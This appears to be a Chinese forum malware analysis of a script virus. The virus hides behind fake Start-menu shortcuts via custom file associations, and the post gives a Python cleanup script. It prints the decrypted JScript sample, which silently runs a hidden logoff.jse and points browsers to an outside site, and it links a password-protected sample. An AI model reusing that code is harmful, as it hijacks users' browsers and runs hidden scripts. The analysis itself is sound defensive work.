
# 一个弱脚本病毒分析查杀

> 原文：[`www.pediy.com/kssd/pediy11/118841.html`](https://www.pediy.com/kssd/pediy11/118841.html)

朋友说中了个病毒很烦，然后就帮她查看了一下。

用 `xuetr` 看了看，没发现什么异常。

最后发现开始菜单下某个文件下的快捷方式都有两个，如图`![](img/45cd02fe75f9afc134d5b4a312d86903.jpg)`。而且一点这个文件，就会在桌面生成淘宝的链接。（这些做淘宝客的人还挺恶心的）。

然后想，会不会是快捷方式指向病毒文件，运行病毒，然后再运行正确的文件。

然后把“快捷方式”拖到 QQ 里传到自己电脑上一看，是一个后缀很奇怪的文件（文件名`卸载.psydckcvewon`）。看这文件名，觉得是随机的，然后 GOOGLE 了一下，搜索不到，果然是随机的。

想到应该是自定义文件后缀，`CMD` 下运行 `assoc` 和 `ftype` 一看，果然是自定义的文件后缀，指向

代码:

```
wscript.exe /B "%1"
```

原来是 `vbs` 文件，然后修改后缀成 `txt` 发现是加密后的 `vbs` 脚本，找个在线的解密一下。

代码:

```
/\*1JQOUESBWBGZK = "unhnyksavqggjdgqugrqaprktpdddpkjik" ; 
CJRWKKQEMVVJ = "vhuujpkkdhllgdrkoqbgcwkxgbtxlutrhk" ; 
JLRKFHVOSMRY = "sokiahwedpwqjusrgkpcxofqkixgmbpltm" ; 
WFSKZTFPUCFP = "swlmymuvkdsosuqinlxhdfvpnmwydvhyii" ; 
NEOCKQHYCWLE = "aynhhixwvpuyppyfeedqkbpvnuidgndmpi" ; 
\*/var __x_abcd = new ActiveXObject("WScript.Shell");
__x_abcd.Run("wscript.exe /B \"C:\\Program Files\\Internt Explorer\\Windows Live\\EditPlus\\logoff.jse\" -run" , 0 , false ) ;
var __x_abhb="C:\\Program Files\\Kingsoft\\WPS Office Personal\\utility\\uninst.exe";
var __x_abgum="";
if (__x_abhb == ""){
WScript.Quit() ;
}
var __x_abce = new Array() ;
__x_abce.push( "MAXTHON.EXE") ;__x_abce.push( "THEWORLD.EXE") ;__x_abce.push( "IEXPLORE.EXE") ;__x_abce.push( "360SE.EXE") ;__x_abce.push( "SOGOUEXPLORER.EXE") ;__x_abce.push( "TTRAVELER.EXE") ;__x_abce.push( "FIREFOX.EXE") ;
var __x_abeo = function(__x_abfk){
var __x_abfkUpper = __x_abfk.toUpperCase();
for (var __x_abfj in __x_abce){
if (__x_abfkUpper.indexOf(__x_abce[__x_abfj]) > 0){
return true
}
}
return false
};
var __x_abcj =new Array() ;
__x_abcj.push( "http://www.80904.cn") ;__x_abcj.push( "http://www.80904.cn") ;__x_abcj.push( "http://www.80904.cn") ;__x_abcj.push( "http://www.80904.cn") ;__x_abcj.push( "http://www.80904.cn") ;__x_abcj.push( "http://www.80904.cn") ;__x_abcj.push( "http://www.80904.cn");
var __x_abck=__x_abcj[parseInt(Math.random() * __x_abcj.length)] ;
if (__x_abeo(__x_abhb)){
__x_abgum = "\"" + __x_abck + "\"" ;
}
__x_abcd.Run("\"" + __x_abhb + "\" " + __x_abgum, 1, false) ;
WScript.Sleep(5000);
```

对 `vbs` 脚本不怎么了解，但还是找到了病毒的主文件代码:

```
C:\\Program Files\\Internt Explorer\\Windows Live\\EditPlus\\logoff.jse\\
```

重新 `ftype` 看一下，发现有很多的自定义脚本后缀伪装成快捷方式，借此运行上面的 `logoff.jse`

`logoff.jse` 大小 400 多 KB，推断应该是纯脚本病毒。

也是加密的，解密了一下，基本上没成功，不过也挺简单的，没什么兴趣继续看下去了，想想根据 `ftype` 和 `assoc` 里的信息直接删除这些伪装的脚本就算删除所有病毒了吧。于是写了个 `py` 脚本，先寻找病毒文件后缀，然后删除。

下面是脚本内容

代码:

```
# coding:utf-8

import os
import tempfile


v_type = tempfile.mktemp()
v_assoc = tempfile.mktemp()
v_ext = []

os.system('ftype >%s' % v_type)
os.system('assoc >%s' % v_assoc)

with open(v_type) as f:
    for line in f.readlines():
        if line.find('wscript.exe /B  "%1"') > 0:
            ftype = line.split('=')[0]
            #print ftype,
            with open(v_assoc) as f:
                for line in f.readlines():
                    line = line.replace('\n', '').replace('\r', '')
                    #print line.split('=')[1]
                    if line.split('=')[1] == ftype:
                        v_ext.append(line.split('=')[0])
                        break

print 'virus ext: '
for ext in v_ext:
    print '\t%s' % ext
print ''

for root, dirs, files in os.walk(''):
    for file in files:
        if os.path.splitext(file)[1] in v_ext:
            virus = os.path.join(root, file)
            print 'delete %s' % virus
            os.unlink(virus)

print ''
print 'Press Enter To Exit .'
raw_input()
```

上传的附件

| `![](img/1baac1a3eff5ac15dae6f33dccc134d9.jpg)` | `Virus.7z.rar` [解压密码是：`kill_virus`] |
| :--- | :--- |
